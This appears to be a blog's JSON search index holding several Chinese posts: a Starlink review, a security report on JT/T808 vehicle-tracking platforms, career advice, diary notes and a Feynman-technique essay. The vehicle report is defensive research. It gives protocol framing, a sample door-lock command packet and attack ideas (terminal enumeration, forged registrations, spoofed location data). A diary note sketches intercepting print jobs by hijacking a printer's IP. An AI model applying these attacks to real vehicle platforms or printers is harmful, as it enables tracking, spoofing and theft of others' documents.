c   ∴ ∃ x P ( x ) Existential generalization ","date":"2021-11-26","objectID":"/zh-cn/26-1/:2:1","tags":["数理化","Mathematics 數學","Discrete Math 離散數學","PropositionalLogic 命題邏輯"],"title":"命題邏輯 Logical Equivalences 邏輯等價, Rules of Inference 推理規則","uri":"/zh-cn/26-1/"},{"categories":["数理化","Mathematics 數學","Discrete Math 離散數學","PropositionalLogic 命題邏輯"],"content":"Reference Logical equivalence - Wikipedia Rule of inference - Wikipedia ","date":"2021-11-26","objectID":"/zh-cn/26-1/:3:0","tags":["数理化","Mathematics 數學","Discrete Math 離散數學","PropositionalLogic 命題邏輯"],"title":"命題邏輯 Logical Equivalences 邏輯等價, Rules of Inference 推理規則","uri":"/zh-cn/26-1/"},{"categories":[],"content":"關於 Starlink 早在 2020 年，SpaceX 就開始推進 Better Than Nothing Beta 測試計畫。2020 年下半年，美國不少符合要求的地址收到了設備。到 2021 年春天，加拿大南部地址的申請陸續通過。我就是在這個時候拿到我的天線，開始體驗。這個過程中，深入了解了這套系統的工作方式以及一些背景資料。一番思索之後決定寫出來，給想折騰或者感興趣的朋友一個參考。整理這些資料的另外一個原因，也是因為很多人對於 Starlink 項目存在一些誤解，有無腦黑的，也有期望過高的。有覺得馬老闆有關的項目都是騙人的，有拿著很多年前 PPT 上老版本規劃數據在吹噓的，也有各種不切實際的盼望衛星接入會在短時間內給人類社會帶來諸如蒸汽機般產業革命的。因此作為早期的用戶，我希望通過一些我的整理和分析，給大家更全面和稍靠譜的認知。 現狀 Starlink 目前計畫先發射 12000 顆衛星。其中 1500 顆在 550 KM 軌道，2800 顆 在 1150 KM 軌道，7500 顆在 340 KM 軌道。完成這個階段之後，將會安排另外 30000 顆，最終達到 42000 顆衛星，組成全球覆蓋。Starlink 平均每週會進行一次發射，到撰文當日為止在軌衛星有 1320 顆。每單顆衛星可以有效覆蓋 2 經度 * 2 緯度 的地表區域，當前主要有效覆蓋集中在美國高緯度和加拿大低緯度地區。在這一緯度區域的部分歐洲國家用戶也開始陸續收到邀請。更多關於衛星相關的資料可以查閱 Wikipedia。 速度 很多人關心 Starlink 的實際速度。這個問題比較複雜，Starlink 最新的目標速度已經從 1 Gbps 提升到 10 Gbps。當然，這估計需要等全部四萬顆衛星在軌才能實現。目前計畫中最近一次提速預期會發生在 2021 年下半年，計畫速度會穩定在 300 Mbps，延遲控制在 20 ms 左右。以上都是畫餅，目前各地用戶的實際速度参差不齐。Raddit 上有一個愛好者整理的測速列表，可以看到各地用戶的實際連接速度，作為參考。總體來說，目前信號比較好的地區可以實現 200 Mbps 下行，50 Mbps 上行，15 ms 延遲。我自己的測速基本上符合這個結果，但是我所在的地區，延遲會相對大一些，平均 40 ms。Starlink 近期已經在測試提速能力，在信號特別好的時候，我測試到最高速度已經可以跑到 400 Mbps 左右。 軌道 Starlink 所使用的 LEO（Low Earth Orbit，近地軌道）方案是與其他民用級衛星上網方案的最大區別。後來者 Amazon 的方案也學習了這一設計。於大家熟知 35786 KM 的 GSO（Geosynchronous Orbit，地球同步軌道）不一樣。大部分人造衛星工作在 GSO，這是因為在這個軌道上衛星的旋轉角速度與地球同步，故稱同步軌道。同步軌道上，衛星相對地球是靜止的。所以星歷的調整，地面通訊站的對準等都相對容易，缺點是距離遠，通訊需要的功率比較高，因此就需要收發功率和體積都比較大的重型天線設備。需要考慮接收設備體積和效率的方案中，都會傾向於採用更低的軌道，例如我們熟知的 GPS，就使用了 20180 KM 的較低軌道。缺點就是更低的軌道單星覆蓋的地表區域更小，要做到全球覆蓋就需要更大規模的衛星群。而且更低的軌道上，衛星的旋轉角速度就需要比地球更快，用高速帶來的離心力來平衡地球衛星之間的萬有引力，才能讓衛星懸停在固定的高度。因此越低軌道的衛星，就需要更高的繞地旋轉速度。所以在沒有 A-GPS的年代，傳統 GPS 設備在定位之前獲得星歷來計算位置，是相當耗時的，往往需要幾分鐘到十幾分鐘才能完成首次定位。Starlink 大量採用 340 ~ 550 KM 軌道，衛星旋轉線速度達到 17500 Mph，約每秒 7.8 km。所以繞了這麼多，需要理解的其實是，Starlink 用戶端天線在通訊時並非是連接單一衛星的，而是對準整條衛星飛行軌道，然後相控天線根據所同步到的星歷，精準與飛過頭頂的衛星收發信號。用戶請求的一個網頁，可能是通過頭頂飛過的若干個衛星分包傳輸回來，在天線內部緩存中拼接完再傳輸給用戶的。而不是很多人想的那樣，頭頂固定一個衛星，通過固定的鏈路實現通訊。這個設計增加了客戶端天線的複雜度，必須使用相控天線陣列才能實現，而不能使用傳統的定向衛星天線。這是因為相控天線陣列支持波束賦形，更容易對準滑過天空的衛星。Starlink 選了一個難度更大，但是更能帶來高帶寬和低延遲的方案。感興趣的話可以到這個網站：https://satellitemap.space/，了解 Starlink 衛星的實時位置。 鏈路 Starlink 設計了兩種鏈路。第一階段實現的是： 用戶 \u003c=\u003e 衛星 \u003c=\u003e 地面站 \u003c=\u003e 網站服務器， 以及目前正在演進的第二階段： 用戶 \u003c=\u003e 衛星 … 衛星 \u003c=\u003e 地面站 \u003c=\u003e 網站服務器。 第二階段的方案主要引入了衛星與衛星之間的通訊，這一階段通過衛星之間的激光束通訊完成。粗略看沒多大區別，但是這才是 Starlink 整個方案中對核心體驗帶來最大期望的一環。在第一階段中，用戶的訪問請求會經由衛星轉發到最近的地面站，流量通過地面站轉發到目標服務器，獲得響應之後原路返回。這個方案簡單，但是缺點很明顯，因為本質上和直接接入光纖沒有區別，而且還額外增加了用戶到衛星，衛星到地面站的延遲，完成一個迴路就需要增加至少 4 個額外的延遲環節。最終依然通過傳統光纖實現主要路由，走完由用戶到網站的物理距離。而且更差的情況是第一個地面站沒有適合的路由，只能把請求轉到另一個衛星，由另一個衛星從其他地面站落地，於是就會出現反覆在地面站和衛星之間跳轉的情況。目前 Starlink 整個方案中，通訊最慢的階段就是衛星和地面之間的這段，如果需要反覆在衛星和地面之間中繼，延遲將會徹底失控。第二階段方案中，網絡流量將通過頭頂的衛星在真空中通過激光束在衛星之間轉發，並在最接近網站服務器的地面站落地，主要通過衛星之間的激光路由走完物理距離。得益於真空中光速是光纖中光速的 1.5 倍，並且軌道上的衛星路由大概率可以得出距離更短，效率更高的轉發方案，因此最終延遲和帶寬都將比第一階段方案好，甚至可能優於傳統光纖接入。2020 年底開始發射的衛星已經具備星星間通訊能力，根據畫餅，完全星星間通訊實現以後，網絡延遲可以控制在 1.8 ms * 4 也就是 10 ms 量級。但是這要求衛星群覆蓋已經相當完善才有希望，目前距離所需要的衛星數量依然相當巨大。事實上目前有效工作的衛星主要集中在北緯度 53 度左右成鏈，這就是為什麼只有美加交界所在的地區可以獲得比較好的連接效果。另外，目前 Starlink 只能提供 IPv4 的連接方式，IPv6 據說即將開放，但是沒有看到有官方的時間表。 階段 1：https://www.youtube.com/watch?v=m05abdGSOxY 階段2：https://www.youtube.com/watch?v=oCKhl–raMs 設備 Starlink 的安裝相當簡單，你會收到一共 3 個主要設備：天線，電源，路由器。 天線雖然看上去和一般衛星電視天線差不多，但是裡面的結構很不一樣。一般的民用衛星天線是把信號反射到中央的接收器處理。Starlink 的天線不是一個整體，而是一個密集的天線陣列。對拆解感興趣的可以看這個視頻：https://www.youtube.com/watch?v=iOmdQnIlnRo。天線在通電之後，會轉動到水平位置，然後開始尋找衛星飛行飛軌道，找到之後會轉到到對應的角度，然後鎖住衛星飛行的軌道。在衛星軌道和天線的相對位置發生變動之後，天線會轉動尋找新的可用軌道。這個尋找耗時幾十秒到幾分鐘不等，所以目前的天線設計是不能掛在移動中的載具上使用的。有消息說針對載具設計的天線已經在開發中，可以支持在車，船，飛機上使用 Starlink 接入。Starlink 的天線運行 Linux 系統，有玩家已經有辦法連到調試串口上監控天線的工作狀態，有完整的啟動 log 可供研究。天線主機不單單完成衛星軌道的對準和追蹤，同時已經完成網絡連接，實現了 NAT，DHCP 等服務，相當於碟子內其實已經有一個小路由器。天線硬件經過了幾個版本的迭代，目前收到的天線硬件版本依然是 Beta，但是版本號已經比早期收到的用戶版本號更高。新版本的天線增加了電加熱融雪等功能。由於我收到的時候渥太華已經進入冬天的尾巴，沒有經歷過大雪天，我會在今年冬天的時候觀察一下融雪性能再補全此文。 Starlink 電源以 POE（Power over Ethernet）形式為天線和路由器供電，同時連通天線和路由器之間的線路。所以體驗上，只需要把網線接好，天線和路由器的供電就同時解決了。電源最高支持 180 W 輸出，常規工作消耗大概在 100 W 左右。 Starlink 路由器其實比較雞肋，它不是是個必須的設備，而且有傳言路由器會在往後的版本被去掉。Starlink 路由器和普通寬帶路由器區別不大，提供 Wi-Fi（802.11a/n/ac），以及一個 Ethernet 接口。你可以把自己的路由器接到 Starlink 路由器下面，當然你也可以直接把自己的自己的路由器接到天線上，然後把 Starlink 路由器扔掉。有一點需要注意，Starlink 路由器實現了一套 gRPC API，用以實時訪問天線工作狀態，包括信號強度，阻擋角度，阻擋強度，阻擋時間，衛星離線時間，Ping 健康度等等信息。實際上","date":"2021-11-26","objectID":"/zh-cn/26/:0:0","tags":[],"title":"關於 Starlink","uri":"/zh-cn/26/"},{"categories":["车联网","卫星","定位系统","安全","威胁","分析"],"content":"此文为加密收费内容添加我微信支付后可看: 国内在线车联网平台（道路运输车辆卫星定位系统）安全威胁分析 ","date":"2021-11-25","objectID":"/zh-cn/25-3/:0:0","tags":["车联网","卫星","定位系统","安全","威胁","分析"],"title":"国内在线车联网平台（道路运输车辆卫星UHF定位系统）安全威胁分析","uri":"/zh-cn/25-3/"},{"categories":["车联网","卫星","定位系统","安全","威胁","分析"],"content":"本报告研究成果由灯塔实验室知风Zhifeng.io安全研究团队发布 报告编号：C-03 一、前言 车联网技术本身是指：车辆上的车载设备通过无线通信技术，对信息网络平台中的所有车辆动态信息进行有效利用，在车辆运行中提供不同的功能服务。车联网表现出以下几点特征为：能够为车与车之间的行驶提供保障，降低车辆发生碰撞事故的几率；可以帮助车主实时导航，并通过与其它车辆和网络系统的通信，提高交通运行的效率；帮助监管/监控方掌控车辆的实时、历史信息，提升车辆管控效率。 一旦车载终端通讯设备或车联网终端管理平台被黑客入侵，黑客可能间接或直接监控汽车的实时运行状态和车辆行驶轨迹，甚至可能对运行参数进行修改，这都将对正在运行的汽车造成不堪设想的后果。 二、现状 目前车联网安全行业研究人员相对较少，远远不如传统安全行业人员众多。在开展安全研究时又因为投入成本高，有极高入门门槛，同时车联网行业的错综复杂，应用的各种通讯协议规范、平台应用众多，导致对于独立安全研究人员来说对车联网安全研究入手相对来说比较难。 终端与服务端的通讯协议是车联网平台中最基础最重要的部分，起到连接和沟通两端的作用，交通部委和各省交通厅都对此制定了相关标准。而在诸多通讯协议标准中， JT/T808协议标准作为交通部牵头定制的用于规定国内道路运输车辆卫星定位系统车载终端与平台之间的通讯协议标准，对各地方性协议的制定具有指导作用，并且被车联网平台所广泛应用，具有一定的权威性和通用性。我们将从对JT/T808协议标准的分析入手，然后进一步分析车联网平台端存在的安全风险，希望能够给大家在相关车联网安全研究上提供一定的帮助。 三、协议介绍 JT/T808全称为《道路运输车辆卫星定位系统终端通讯协议及数据格式》，其中按照年份现阶段共发布了三个相关版本分别为：JT/T808-2011、JT/T808-2013、JT/T808-2019。协议规定了道路运输车辆卫星定位系统车载终端与车联网监管/监控平台之间的通信协议与数据格式, 包括协议基础、通信连接、消息处理、协议分类与要求及数据格式。 JT/T808通信协议采用TCP或UDP进行封装传输，车联网监管/监控平台（以下简称“平台”）作为服务器端，道路运输车辆卫星定位系统车载终端（以下简称“终端”）作为客户端。当数据通信链路异常时，终端可采用SMS消息方式通信，通信整体流程如下： ","date":"2021-11-25","objectID":"/zh-cn/25-3/:0:1","tags":["车联网","卫星","定位系统","安全","威胁","分析"],"title":"国内在线车联网平台（道路运输车辆卫星UHF定位系统）安全威胁分析","uri":"/zh-cn/25-3/"},{"categories":["车联网","卫星","定位系统","安全","威胁","分析"],"content":"3.2 协议传输规则 协议应采用大端模式的网络字节序来传递字和双字。传输规则约定如下： BYTE的传输，按照字节流的方式传输； WORD的传输，先传递高八位，再传递低八位； DWORD的传输，先传递高二十四位，然后传递高十六位，再传递高八位，最后传递低八位。 ","date":"2021-11-25","objectID":"/zh-cn/25-3/:1:0","tags":["车联网","卫星","定位系统","安全","威胁","分析"],"title":"国内在线车联网平台（道路运输车辆卫星UHF定位系统）安全威胁分析","uri":"/zh-cn/25-3/"},{"categories":["车联网","卫星","定位系统","安全","威胁","分析"],"content":"3.3 通讯协议解析 每条消息由标识位、消息头、消息体和校验码组成，详细数据结构如下： 标识位 消息头 消息体 校验码 标志位 JT/T808协议采取0x7e作为数据标识位，标识位位于每条消息的首尾两端；对于除标识位之外的0x7e和0x7d则要进行转义： 先7d→7d 01 再7e→7d 01 消息头中主要包括：消息ID、消息体属性、协议版本号、终端手机号、消息流水号、消息包封装。 消息体的数据格式和内容根据对应命令进行确定，消息体的相关属性由消息头中的消息体属性来确定，具体包括：保留字段、版本标识、分包、数据加密方式、消息体长度。 校验码通过异或方式计算得到。 ","date":"2021-11-25","objectID":"/zh-cn/25-3/:2:0","tags":["车联网","卫星","定位系统","安全","威胁","分析"],"title":"国内在线车联网平台（道路运输车辆卫星UHF定位系统）安全威胁分析","uri":"/zh-cn/25-3/"},{"categories":["车联网","卫星","定位系统","安全","威胁","分析"],"content":"3.4 通讯消息例示 服务端发送信息例示——车门加锁命令： 7E 85 00 00 01 01 23 45 67 89 98 00 06 01 14 7E 消息分析： 内容 含义 数据类型 7E 标识位 BYTE 85 00 消息ID——车辆控制 WORD 00 01 消息体属性 WORD 01 23 45 67 89 98 终端手机号 BCD[10] 00 06 流水号 WORD 01 消息体 14 校验码 BYTE 7E 标识位 BYTE 终端发送信息例示——终端位置信息上报： 7E 02 00 00 26 01 23 45 67 89 98 00 7D 02 00 00 00 01 00 00 00 02 00 BA 7F 0E 07 E4 F1 1C 00 28 00 3C 00 00 18 10 15 10 10 10 01 04 00 00 00 64 02 02 00 7D 01 13 7E 消息分析： 内容 含义 数据类型 7E 标识位 BYTE 02 00 消息ID——位置信息汇报 WORD 00 26 消息体属性 WORD 01 23 45 67 89 98 终端手机号 BCD[10] 00 7D 02（转义前00 7E） 流水号 WORD 00 00 00 01 00 00 00 02 00 BA 7F 0E 07 E4 F1 1C 00 28 00 3C 00 00 18 10 15 10 10 10 01 04 00 00 00 64 02 02 00 7D 01 消息体 13 校验码 BYTE 7E 标识位 BYTE 注：流水号中7D 02转义前为7E，消息体中7D 01转义前为7D；转义封包等规则详见《JTT 808-2019-道路运输车辆卫星定位系统终端通讯协议及数据格式》 四、车联网平台端可能存在的安全风险分析 ","date":"2021-11-25","objectID":"/zh-cn/25-3/:3:0","tags":["车联网","卫星","定位系统","安全","威胁","分析"],"title":"国内在线车联网平台（道路运输车辆卫星UHF定位系统）安全威胁分析","uri":"/zh-cn/25-3/"},{"categories":["车联网","卫星","定位系统","安全","威胁","分析"],"content":"4.1车联网平台服务端与终端交互的安全风险 车联网平台与终端在JT/T808协议时，一般的鉴权机制为：终端在未注册状态下，首先进行注册，注册成功后终端将获得鉴权码并保存，鉴权码在终端登录时使用，车辆需要拆除或更换终端前，终端应该执行注销操作，取消终端和车辆的对应关系。 鉴于车联网平台开发厂家众多，在平台服务端协议栈的实现方面不同的厂家，可能存在不同的实现思路，从技术层面分析车联网平台端可能存在如下风险： ","date":"2021-11-25","objectID":"/zh-cn/25-3/:4:0","tags":["车联网","卫星","定位系统","安全","威胁","分析"],"title":"国内在线车联网平台（道路运输车辆卫星UHF定位系统）安全威胁分析","uri":"/zh-cn/25-3/"},{"categories":["车联网","卫星","定位系统","安全","威胁","分析"],"content":"4.1.1 车载终端枚举 直接通过发送符合JT/T808协议格式的数据包到达服务端后，平台不进行相关鉴权也会返回给客户端符合JT/T808协议格式的数据包，因此可以发送携带不同的终端手机号的数据包，根据服务端的响应来对终端进行枚举，探测真实存在的终端手机号。黑客可以通过此方式实现专项渗透测试攻击，极易锁定相关目标。 ","date":"2021-11-25","objectID":"/zh-cn/25-3/:4:1","tags":["车联网","卫星","定位系统","安全","威胁","分析"],"title":"国内在线车联网平台（道路运输车辆卫星UHF定位系统）安全威胁分析","uri":"/zh-cn/25-3/"},{"categories":["车联网","卫星","定位系统","安全","威胁","分析"],"content":"4.1.2 车载终端异常数据伪造 根据JTT808协议规定，终端在正式进行使用之前，设备首先会发送注册数据通过服务端进行注册，服务端注册成功后终端将获得鉴权码，并把相关注册信息在平台保存。这一过程中看似没有相关安全风险，但是如果攻击者通过伪造注册请求或者其他符合协议的异常数据内容，服务端将会出现大量异常设备验证或鉴权操作错误日志与记录，干扰管理人员审计；并以此消耗服务器运算资源，从而可能导致服务端拒绝服务。 ","date":"2021-11-25","objectID":"/zh-cn/25-3/:4:2","tags":["车联网","卫星","定位系统","安全","威胁","分析"],"title":"国内在线车联网平台（道路运输车辆卫星UHF定位系统）安全威胁分析","uri":"/zh-cn/25-3/"},{"categories":["车联网","卫星","定位系统","安全","威胁","分析"],"content":"4.1.3 车载终端通信伪造 在协议通讯过程中，JT/T808服务端的开发者可能并不会对数据上报来源进行限制，因此再得知设备的终端手机号车牌号等信息的情况下，可以通过模拟设备与数据平台进行通讯，发送异常报警与位置数据。 ","date":"2021-11-25","objectID":"/zh-cn/25-3/:4:3","tags":["车联网","卫星","定位系统","安全","威胁","分析"],"title":"国内在线车联网平台（道路运输车辆卫星UHF定位系统）安全威胁分析","uri":"/zh-cn/25-3/"},{"categories":["车联网","卫星","定位系统","安全","威胁","分析"],"content":"4.2 车联网平台服务端安全风险 ","date":"2021-11-25","objectID":"/zh-cn/25-3/:5:0","tags":["车联网","卫星","定位系统","安全","威胁","分析"],"title":"国内在线车联网平台（道路运输车辆卫星UHF定位系统）安全威胁分析","uri":"/zh-cn/25-3/"},{"categories":["车联网","卫星","定位系统","安全","威胁","分析"],"content":"4.2.1 服务端管理WEB安全风险 车联网平台为了便于使用者的访问和操作，通常使用Web服务来实现管理平台端。因此同样易受到各类Web安全风险影响，如弱口令、敏感信息泄露、未授权访问、中间件RCE等安全风险影响。 我们在研究中发现“登录弱口令（初始口令）”、“数据库暴露公网，数据库弱口令（初始密码）”以及敏感信息泄露（日志文件泄露数据库连接密码、泄露车辆sim号）等风险较为常见，并以较低的利用成本威胁车联网系统信息安全。 ","date":"2021-11-25","objectID":"/zh-cn/25-3/:5:1","tags":["车联网","卫星","定位系统","安全","威胁","分析"],"title":"国内在线车联网平台（道路运输车辆卫星UHF定位系统）安全威胁分析","uri":"/zh-cn/25-3/"},{"categories":["车联网","卫星","定位系统","安全","威胁","分析"],"content":"4.2.2 API接口安全风险 一些车联网平台的移动端程序与服务端进行数据交互一般通过API接口来实现，同时API接口也被用于第三方平台请求车联网平台的数据。这些API接口可能存在着安全隐患，例如：越权，输入控制（xss、注入），接口滥用（爆破），信息泄露等。 ","date":"2021-11-25","objectID":"/zh-cn/25-3/:5:2","tags":["车联网","卫星","定位系统","安全","威胁","分析"],"title":"国内在线车联网平台（道路运输车辆卫星UHF定位系统）安全威胁分析","uri":"/zh-cn/25-3/"},{"categories":["车联网","卫星","定位系统","安全","威胁","分析"],"content":"4.2.3 平台运维管理风险 车联网平台功能众多，操作起来相对复杂，并且平台部署涉及诸多软件和服务，对于非相关专业的管理人员和运维人员来说操作有一定难度，若没有专业的技术培训和安全培训则可能对平台带来一定风险。 例如运维配置不当导致车辆信息报送漏发、错发数据造成的风险等。平台管理安全意识不足或对平台使用不理解则可能导致管理账号弱口令，下级账号权限分配不当以致信息泄露或越权操作等安全风险。 五、在线情况分析 目前，使用JT/T808的车载终端主要通过物联网SIM卡，经由3G、4G网络，与位于互联网的车联网平台服务端进行通讯，JT/T808协议的标准规范方面目前没有具体约定TCP/UDP传输的方式和标准的通信端口，一般用户会自行选择使用TCP或者UDP指定特定端口进行数据通信。 根据Zhifeng综合分析数据显示国内车联网平台分布情况如下： 六、解决方案与对应策略 根据知风安全分析团队研究发现，当前JT/T808车联网通讯协议中存在的风险主要来自三个方面，分别是：服务端厂商搭建的车联网平台WEB系统安全风险隐患与厂商根据通讯协议开发的通讯程序存在的隐患以及通讯协议中设计逻辑存在的缺陷可能导致的安全风险。 我们建议在针对通讯协议层通讯数据实施安全优化，针对互联网在线的车联网平台的协议服务端针对异常逻辑的数据包不响应，有条件情况下可以尝试升级成必要的加密通讯，按照加密规范来约束各个厂商之间的实现逻辑；厂商开发的通讯程序时应严格按照协议标准规定进行开发，并应在上线前对程序进行安全测试；车联网平台WEB系统方面应该避免出现常见的弱口令、信息泄露、目录遍历、RCE等漏洞。 七、如何确认我当前周边是否存在车联网平台？ 您可以使用移动设备浏览器登录Zhifeng.io或直接使用移动设备浏览器打开：https://zhifeng.io/mobile/online 来查看您周边是否存在车联网平台。 八、参考链接 http://www.mot.gov.cn/yijianzhengji/201706/P020170629514064508301.pdf ","date":"2021-11-25","objectID":"/zh-cn/25-3/:5:3","tags":["车联网","卫星","定位系统","安全","威胁","分析"],"title":"国内在线车联网平台（道路运输车辆卫星UHF定位系统）安全威胁分析","uri":"/zh-cn/25-3/"},{"categories":["突破"],"content":"此文为加密收费内容添加我微信支付后可看: 为什么无法突破到下一个层级？ 在阿里工作了五六年，见过很多优秀的工程师和合作伙伴，同时也看到了不少同学因为无法突破到下一个层级，而选择了放弃，或者泄气。 很多事情看起来是特别清晰的，一步、两步、三步，把这几个步骤走完了，事情也就结束了；与其说清晰，还不如说简单吧，特别是业务性的工作，真的是一眼可以望到尽头。我们必须承认，工作很多时候是需要用点蛮力的，你拥有再多的技能，在受限的环境下，也难以施展开来。**所谓的脏活、苦活、累活，你不想去做，但是也得去做，因为那是成就你的一部分内容，可能你的运气好一点，这种活有人替你扛下来了。 如何在看似恶劣的环境中存活下来，然后逐步拔高呢？下面我列举了几个常规性问题和操作，以促进思考： 1、思考不足 在工作中的执行属性过强，对问题缺乏深度的思考，简单点说，就是问「为什么」问的太少了，在问题过来的时候，我们必须搞清楚为什么背后的为什么，打破砂锅问到底。写作是一个很好的弥补措施，thinking in writing，写的过程就会促使自己去整理和思考。 2、视野不够 只能看到自己的问题，只能看到当下的问题，缺乏横向和纵向的比较。遇到问题，多看看别人是怎么处理的，想一想自己做的东西别人可以如何利用，既要走出去又要领进来。 3、底蕴不强 解决的大多数问题都是简单问题，挥一挥手打个补丁就结束了，很少去思考共性问题，缺乏服务意识和产品化能力。这一点并不难突破，在多思考和总结的基础上，多一些耐心，咬定青山不放松，在难啃的骨头上多啃几下，很多事情就可以拨开云雾见青天了。 上限和下限 最近看到一个不错的观点，说努力决定你的下限，而选择决定了你的上限，我觉得说的有一定的道理。 作为一个技术人，扎实的基础和丰富的经验是行业立命之本，在这一块是绝对虚不得的，必须花费大把的努力，让自己的根基更加夯实。 而选择，伴随了太多的不确定性，运气显得有点重要，但是我想说的是，尽可能地提升自己，让自己成为别人的首选项，才能给自己争取更多的议价能力，坑有的时候就那么几个，争取让自己成为萝卜。 ","date":"2021-11-25","objectID":"/zh-cn/25-2/:0:0","tags":["突破"],"title":"为什么无法突破到下一个层级？","uri":"/zh-cn/25-2/"},{"categories":["外设","打印机"],"content":"覺得約異性出去一定是要約砲的人 腦袋裝什麼不證自明了吧？ 用自己的標準看大家，當然怎麼看都覺得有問題。 當一台車看大家怎麼都逆向的時候，他才是逆向那個。 這個笑話我阿公還在阿根廷的時候就聽過了。 忽然想到一种对打印机的攻击办法。 打印机人人可以物理访问，攻击者可在访问时在设置中修改其IP。 接着攻击者可以再用一台设备占用这个IP，转发所有流量到新的打印机IP上，在此过程中监听流量，获取其他人打印的文件内容 学校里有一台打印机只要访问9100端口就会把发过去的内容打印到纸上。 通过它可以很轻易地展示\\r和\\n的区别。 左图是发包的代码，右图是打印结果。如右图所示，\\r能够让打印机回到行首但不会切到下一行，\\n则能够让打印机切换到下一行但不会回到行首。 所以只有\\r\\n配合，才能达到“回车+换行”的效果 ![[11CDAA67-932D-4562-86D0-BC8864581639.png]] ![[C5067765-99C1-4C10-9B86-E74F944CAF15.jpeg]] 学校里有一台打印机只要访问9100端口就会把发过去的内容打印到纸上。 通过它可以很轻易地展示\\r和\\n的区别。 左图是发包的代码，右图是打印结果。如右图所示，\\r能够让打印机回到行首但不会切到下一行，\\n则能够让打印机切换到下一行但不会回到行首。 所以只有\\r\\n配合，才能达到“回车+换行”的效果 反思了下，為什麼別的師傅那麼厲害，而我為什麼一直這麼菜？ 1.學這學那，什麼都想學，最後什麼都不會。 2.給自己定了目標卻沒有堅持。 3.沒有針對一處學精，入門就覺得自己懂了。 4.缺少實踐，閱讀文檔非常多，卻沒有運用。 5.【可用就行】，過度搬運現成代碼，缺少自己動手。 ","date":"2021-11-25","objectID":"/zh-cn/25-1/:0:0","tags":["外设","打印机"],"title":"日常记录","uri":"/zh-cn/25-1/"},{"categories":["费曼","技术","学习"],"content":"使用费曼技术更快地学习任何东西 Sunny Labh的Feynman插图灵感来自ZenPencils Richard Feynman被认为是科学史上最神奇的人物之一。1965年QED诺贝尔奖得主（与J.Schwinger和Tomonaga），博士费曼是一位非常令人惊叹的教育家和伟大的物理学家。Feynman与许多其他对科学的贡献一起，创造了一种数学理论，解释了液氦中的超流体现象。此后，他（与Murray Gell-Mann一起）对β衰变等弱相互作用做出了根本性贡献。在晚年，费曼提出了高能质子碰撞过程的帕顿模型，在夸克理论的发展中发挥了重要作用。他还在物理学中引入了基本的新计算技术和符号。除了是一名物理学家外，他还曾多次担任收音机修理工、撬锁师、艺术家、舞蹈家、邦戈演奏家、一位伟大的教师和一名表演者，他作为罗杰委员会的一部分成功展示了1986年挑战者航天飞机灾难的原因。 更真实的描述会说，费曼都是天才，都是小丑。深思熟虑和快乐的小丑并不是分裂性格的单独部分……他同时思考和小丑。”——弗里曼·戴森，1988年对费曼的评论。 加州理工学院的费曼 Richard Feynman的天才从他三卷本的物理学书籍_《Feynman物理讲座》_中显而易见，该书基于他1961-1963年在加州理工学院的讲座。 在他十几岁时，理查德·费曼的高中不提供任何微积分课程。作为一名高中生，他决定自学微积分，并为实用人_阅读_微积分。 学分：梅林达·鲍德温 Feynman一直认为，如果一个人不能用简单的语言解释某事，他就不明白。类似的引文也归因于阿尔伯特·爱因斯坦。无论它最初是否来自费曼，这个想法都是优雅真实的，事实上，它是费曼学习东西技术的基础。Feynman经常被认为是_伟大的解释者_，因为他能够以极其简单和易懂的方式解释科学中复杂的概念，特别是物理学，以非科学背景的人可以理解的方式解释。 他打开一本新的笔记本。在扉页上，他写道：我不知道的事情笔记。这是第一次但不是最后一次，他重组了他的知识。他花了几周时间拆解物理学的每个分支，给零件上油，然后把它们重新组装在一起，一直在寻找原始边缘和不一致之处。他试图找到每个主题的基本核心。——詹姆斯·格莱克在他的理查德·费曼传记中 什么是费曼技术？ 费曼学习技巧主要涉及四个简单的步骤： \u003e选择一个你想理解的主题，并开始研究它 \u003e假装向教室、孩子或不熟悉该主题的人教授该主题 \u003e当你陷入困境时，回到资源材料 \u003e简化和组织 步骤1： 这种技术几乎适用于任何学科或任何学科和概念，尽管它说_费曼_技术，但它不仅限于数学或物理，还可以应用于广泛的领域。使用这种技术的第一步是选择主题并开始研究它。现在，学习并不意味着只是记住事实。事实上，费曼本人总是反对记忆文化，他总是认为一个人应该学习和理解原则，而不是记住事实或公式。另一个研究某物的好方法是写作。在一张纸上写点东西会刺激你大脑的海马体，海马体是主要负责记忆和学习的部分。 步骤2： 如果你想掌握一些东西，就教它。教学是学习的有力工具。 用你自己的话解释这些概念，并尝试向孩子或完全不熟悉这个主题的人解释。你也可以假装向桌子上的橡胶鸭解释它。想法是尝试用尽可能简单明了的语言分解事情。尝试使用简单的术语和词汇，不要把自己局限于你学到的事实。您不妨包括一两个示例，以使事情更简单，或创建您自己的示例，以确保它与主要想法相关联。如果你这样做，你就能更容易地更深入地理解事情，并帮助你建立联系。 所有东西都是由原子组成的——小粒子以永恒的运动移动，当它们相距稍远时相互吸引，但在被挤压时会排斥。在那句话中……有大量关于世界的信息。 他建议，使用最少的单词在一句话中，最有价值的科学知识信息是陈述原子假设。 步骤3： 这是一个极其关键的步骤，你可以从你缺少的地方学习。当您用简单的术语解释或写作时，您总是遇到某些领域，在这些领域，您发现很难解释、建立联系或制定示例。在这里，无论您的主要参考是什么，都可以回到资源材料、书籍或期刊或互联网，并填补知识空白。您可以通过几个实例来识别您的差距，例如无法解释某事或简化某事，忘记一些要点等。想法是回去，再次修改事情。这有助于你更好地理解事情。在这个步骤中，您知道您需要工作和关注的领域，这些领域是学习过程的重要组成部分。了解自己的局限性，然后努力让他们更好地了解它们，这是这一步的重点，它就像魔法一样起作用。 步骤4： 产品现在来了。一旦你纠正了错误并纠正了困难，你就会简化解释并使之变得更好。您可以随时返回第2步和第3步，直到您清楚地了解主题。您的笔记和示例现在以尽可能简单的形式出现，并且您对正在研究的主题有了更深入的理解。你可以一遍又一遍地遵循这种方法，直到你觉得你已经掌握了这个概念。 博士费曼在加州理工学院任教 在您的最终解释准备就绪后，您可以将其传达给您熟悉您专业知识领域的同事、朋友或专业人士，并反思您对事物的理解。这种测试和学习方法效果很好。Feynman一直认为，真相在于简单，当事物简单优雅时，可以更好地理解。事情过于复杂要容易得多，这往往表明缺乏深刻的理解。想法是让事情变得足够简单，任何人都能理解，然后使用该工具来加深自己的理解。 费曼学习技巧可帮助您从不同的角度学习和理解事物。它不仅可以用于学术目的，还可以用于建立企业、创建初创企业、心理模型等。Feynman Technique是掌握几乎多信息集的绝佳方法 最快的学习方法是模仿、逆向工程，就是学习当今世界最顶级的人或书的思想。学过后，视野和格局也会快速地提升。 